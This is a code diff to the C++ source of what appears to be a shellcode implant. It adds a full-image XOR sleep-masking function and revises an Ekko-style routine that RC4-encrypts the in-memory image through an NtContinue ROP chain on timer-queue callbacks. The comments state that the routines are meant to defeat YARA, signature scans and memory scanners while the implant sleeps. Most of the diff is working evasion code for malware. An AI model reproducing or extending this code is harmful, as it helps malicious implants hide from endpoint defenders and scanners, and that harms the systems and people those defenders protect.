@@ -26,7 +26,7 @@
  *
  * NOTE: MASK_EKKO replaces the entire sleep cycle (pre + sleep + post) via
  * evasion_ekko_sleep(). It uses CreateTimerQueueTimer + NtContinue ROP to
- * encrypt the image, sleep, and decrypt — all from ntdll timer-thread context.
+ * encrypt the image, sleep, and decrypt - all from ntdll timer-thread context.
  * On x86 builds, MASK_EKKO falls back to MASK_DEFAULT behavior.
  */
 
@@ -61,8 +61,16 @@ static auto declfn mask_post_sleep( instance& inst ) -> void {
 /* ── Full image: XOR entire shellcode region ──
  * Masks all code and embedded data in the shellcode image.
  * Defeats YARA rules, signature scans, and string matching during sleep.
- * Requires VirtualProtect RX→RW→RX flip - generates ETW telemetry.
+ * Requires VirtualProtect RX→RWX→RX flip - generates ETW telemetry.
+ *
+ * ARCHITECTURE: Like Ekko, this mask owns the entire sleep cycle. The
+ * pre/post split doesn't work here because mask_pre_sleep returns into
+ * evasion_pre_sleep / sleep_with_jitter - code that was just XOR'd.
+ * Instead, fi_sleep() does: XOR → NtDelayExecution → un-XOR → return.
+ * All mask functions remain in the skip region and never get encrypted.
  */
+
+static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void;
 
 static auto declfn xor_image(
     instance& inst, uintptr_t skip_base, uint32_t skip_size
@@ -99,22 +107,61 @@ static auto declfn flip_protection(
     return old_protect;
 }
 
-static auto declfn mask_pre_sleep( instance& inst ) -> void {
-    if ( !inst.evasion.ekko.initialized ) return;
+static auto declfn fi_skip_region(
+    uintptr_t& out_base, uint32_t& out_size
+) -> void {
+    uintptr_t addrs[] = {
+        reinterpret_cast<uintptr_t>( &xor_image ),
+        reinterpret_cast<uintptr_t>( &flip_protection ),
+        reinterpret_cast<uintptr_t>( &fi_skip_region ),
+        reinterpret_cast<uintptr_t>( &fi_sleep ),
+        reinterpret_cast<uintptr_t>( &xor_sensitive_data ),
+    };
+    uintptr_t lo = addrs[0], hi = addrs[0];
+    for ( int i = 1; i < 5; i++ ) {
+        if ( addrs[i] < lo ) lo = addrs[i];
+        if ( addrs[i] > hi ) hi = addrs[i];
+    }
+    out_base = lo;
+    out_size = static_cast<uint32_t>( hi - lo ) + 0x400;
+}
+
+/* Owns entire sleep cycle: XOR image → sleep → un-XOR image.
+ * Never returns while image is encrypted - caller code stays valid. */
+static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void {
+    if ( !inst.evasion.ekko.initialized ) {
+        LARGE_INTEGER delay;
+        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+        inst.ntdll.NtDelayExecution( FALSE, &delay );
+        return;
+    }
+
+    uintptr_t skip_base; uint32_t skip_size;
+    fi_skip_region( skip_base, skip_size );
+
+    /* mask - RWX keeps skip region executable while we XOR the rest */
     xor_sensitive_data( inst );
-    flip_protection( inst, PAGE_READWRITE );
-    uintptr_t self = reinterpret_cast<uintptr_t>( &mask_pre_sleep );
-    xor_image( inst, self, 0x100 );
+    flip_protection( inst, PAGE_EXECUTE_READWRITE );
+    xor_image( inst, skip_base, skip_size );
+
+    /* sleep - image is encrypted, these functions are in skip region */
+    LARGE_INTEGER delay;
+    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+    inst.ntdll.NtDelayExecution( FALSE, &delay );
+
+    /* unmask */
+    xor_image( inst, skip_base, skip_size );
     flip_protection( inst, PAGE_EXECUTE_READ );
+    xor_sensitive_data( inst );
+}
+
+/* Pre/post are no-ops - fi_sleep owns the full cycle. */
+static auto declfn mask_pre_sleep( instance& inst ) -> void {
+    (void)inst;
 }
 
 static auto declfn mask_post_sleep( instance& inst ) -> void {
-    if ( !inst.evasion.ekko.initialized ) return;
-    flip_protection( inst, PAGE_READWRITE );
-    uintptr_t self = reinterpret_cast<uintptr_t>( &mask_post_sleep );
-    xor_image( inst, self, 0x100 );
-    flip_protection( inst, PAGE_EXECUTE_READ );
-    xor_sensitive_data( inst );
+    (void)inst;
 }
 
 
@@ -212,7 +259,7 @@ static auto declfn mask_post_sleep( instance& inst ) -> void {
  *   1. Flip image memory to RW
  *   2. RC4-encrypt the entire shellcode image via SystemFunction032
  *   3. Sleep via WaitForSingleObject (image is encrypted during this)
- *   4. RC4-decrypt the image (symmetric — same key)
+ *   4. RC4-decrypt the image (symmetric - same key)
  *   5. Restore RX permissions
  *   6. Signal completion event
  *
@@ -221,7 +268,7 @@ static auto declfn mask_post_sleep( instance& inst ) -> void {
  * sleep duration. Defeats memory scanners, YARA, and signature matching.
  *
  * Each timer callback receives a single LPVOID. For functions needing multiple
- * arguments, we build a CONTEXT struct and call NtContinue — the timer callback
+ * arguments, we build a CONTEXT struct and call NtContinue - the timer callback
  * target is NtContinue, and the LPVOID is a pointer to a CONTEXT whose RIP/RCX/
  * RDX/R8/R9 encode the real function call.
  *
@@ -324,7 +371,7 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 
     /* Find a `ret` (0xC3) gadget in ntdll .text for the NtContinue return address.
      * When the target function returns, it hits this `ret` which pops the next
-     * value from RSP — effectively cleanly exiting the timer callback. */
+     * value from RSP - effectively cleanly exiting the timer callback. */
     uintptr_t ret_gadget = 0;
     {
         auto ntdll_base = reinterpret_cast<uint8_t*>( inst.ntdll.handle );
@@ -345,7 +392,7 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     found_gadget:;
     }
 
-    /* Validate all pointers — fall back to simple masking on failure */
+    /* Validate all pointers - fall back to simple masking on failure */
     if ( !pCreateTimerQueue || !pCreateTimerQueueTimer || !pDeleteTimerQueue ||
          !pCreateEventW || !pSetEvent || !pNtContinue || !pRtlCaptureContext ||
          !pSystemFunction032 || !ret_gadget ) {
@@ -395,12 +442,12 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 
     /* We need 6 contexts for 6 NtContinue calls:
      *   [0] VirtualProtect( img_base, img_size, PAGE_READWRITE, &old_protect )
-     *   [1] SystemFunction032( &img_data, &key_data )      — encrypt
-     *   [2] WaitForSingleObject( hEvent, sleep_ms )         — sleep
-     *   [3] SystemFunction032( &img_data, &key_data )      — decrypt
+     *   [1] SystemFunction032( &img_data, &key_data )      - encrypt
+     *   [2] WaitForSingleObject( hEvent, sleep_ms )         - sleep
+     *   [3] SystemFunction032( &img_data, &key_data )      - decrypt
      *   [4] VirtualProtect( img_base, img_size, old_protect, &old_protect )
      *       ^ We use PAGE_EXECUTE_READ here since we know the original prot
-     *   [5] SetEvent( hEvent )                              — signal done
+     *   [5] SetEvent( hEvent )                              - signal done
      */
 
     CONTEXT rop_ctx[6];
@@ -416,7 +463,7 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
         ret_gadget
     );
 
-    /* Timer 1: SystemFunction032 — encrypt */
+    /* Timer 1: SystemFunction032 - encrypt */
     ekko_setup_context(
         &ctx_template, &rop_ctx[1],
         reinterpret_cast<uintptr_t>( pSystemFunction032 ),
@@ -426,7 +473,7 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
         ret_gadget
     );
 
-    /* Timer 2: WaitForSingleObject — the actual sleep (image encrypted) */
+    /* Timer 2: WaitForSingleObject - the actual sleep (image encrypted) */
     ekko_setup_context(
         &ctx_template, &rop_ctx[2],
         reinterpret_cast<uintptr_t>( inst.kernel32.WaitForSingleObject ),
@@ -436,7 +483,7 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
         ret_gadget
     );
 
-    /* Timer 3: SystemFunction032 — decrypt (RC4 is symmetric) */
+    /* Timer 3: SystemFunction032 - decrypt (RC4 is symmetric) */
     ekko_setup_context(
         &ctx_template, &rop_ctx[3],
         reinterpret_cast<uintptr_t>( pSystemFunction032 ),
@@ -457,7 +504,7 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
         ret_gadget
     );
 
-    /* Timer 5: SetEvent — signal completion */
+    /* Timer 5: SetEvent - signal completion */
     ekko_setup_context(
         &ctx_template, &rop_ctx[5],
         reinterpret_cast<uintptr_t>( pSetEvent ),
@@ -502,13 +549,13 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 
         /* Wait for the final SetEvent timer to signal completion.
          * Add generous timeout: sleep_ms + 10s for timer scheduling overhead.
-         * If this times out, something went wrong — we still try to recover. */
+         * If this times out, something went wrong - we still try to recover. */
         inst.kernel32.WaitForSingleObject( hEvent, sleep_ms + 10000 );
 
-        /* Restore sensitive data — image is now decrypted and RX again */
+        /* Restore sensitive data - image is now decrypted and RX again */
         xor_sensitive_data( inst );
     } else {
-        /* Timer queue setup failed — fall back to simple XOR masking */
+        /* Timer queue setup failed - fall back to simple XOR masking */
         xor_sensitive_data( inst );
         LARGE_INTEGER delay;
         delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
@@ -531,7 +578,7 @@ static auto declfn mask_post_sleep( instance& inst ) -> void {
     (void)inst;
 }
 
-#else /* x86 fallback — Ekko ROP requires x64 CONTEXT manipulation */
+#else /* x86 fallback - Ekko ROP requires x64 CONTEXT manipulation */
 
 static auto declfn mask_pre_sleep( instance& inst ) -> void {
     if ( !inst.evasion.ekko.initialized ) return;
